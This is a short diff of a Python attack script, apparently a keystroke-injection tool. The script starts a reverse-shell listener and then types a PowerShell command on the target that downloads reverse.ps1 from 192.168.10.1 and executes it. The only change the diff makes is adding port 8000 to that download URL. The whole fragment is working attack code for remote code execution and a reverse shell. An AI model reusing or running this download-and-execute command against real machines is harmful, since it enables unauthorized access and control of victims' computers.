@@ -90,7 +90,7 @@ def payload(web_dir):
 
 	shelllistener=Process(target=reverse_shell_listener)
 	shelllistener.start()
-	eco.type("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.1/reverse.ps1');\"")
+	eco.type("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.1:8000/reverse.ps1');\"")
 	eco.press("ENTER")
 	print("Waiting for shell to exit")
 	shelllistener.join()
